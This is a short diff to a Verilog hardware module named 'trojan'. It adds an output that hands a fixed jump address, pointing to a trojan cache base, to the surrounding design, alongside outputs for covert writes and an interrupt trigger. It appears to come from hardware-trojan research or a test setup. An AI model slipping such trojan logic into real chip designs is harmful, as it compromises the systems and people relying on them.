@@ -52,7 +52,8 @@ module trojan (
 	output reg [127:0] 	o_troj_write_data,
 	output reg [31:0]	o_troj_write_addr,
 
-    output reg          o_troj_trigger_irq
+    output reg          o_troj_trigger_irq,
+    output wire	[31:0]	o_troj_jump_addr
     );
     
     reg       startup;
@@ -69,6 +70,8 @@ module trojan (
     reg [2:0] offset_nxt;
     reg [`DATA_STORE_BITS-1:0] trojan_data_store;
     reg [`DATA_STORE_BITS-1:0] trojan_data_store_nxt;
+
+    assign o_troj_jump_addr = `TROJ_CACHE_BASE_ADDR;
 
     always @(*) begin
         startup_nxt = startup;
